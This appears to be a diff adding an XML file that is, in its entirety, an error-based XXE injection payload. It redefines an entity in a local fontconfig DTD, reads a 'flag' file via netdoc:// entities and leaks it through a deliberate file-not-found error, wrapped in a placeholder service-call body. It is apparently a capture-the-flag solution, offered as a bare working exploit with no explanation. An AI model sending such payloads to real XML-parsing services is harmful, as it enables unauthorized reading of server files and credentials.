@@ -1,0 +1,27 @@
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+    <!ELEMENT root ANY >
+    <!ENTITY % local SYSTEM "netdoc:///usr/share/xml/fontconfig/fonts.dtd">
+
+<!ENTITY % constant 'family)>
+ <!ENTITY % f SYSTEM "netdoc:///flag">
+        <!ENTITY % eval "<!ENTITY % error SYSTEM 'netdoc:///nonexistent/%f;'>">
+        %eval;
+        %error;
+<!ELEMENT patelt (family'>
+
+    %local;
+]>
+<root>
+    <input>
+        <serviceCall>
+            <service>xx</service>
+            <address>xx</address>
+            <operate>write</operate>
+            <params>
+                f
+            </params>
+            <return>x</return>
+        </serviceCall>
+    </input>
+</root>
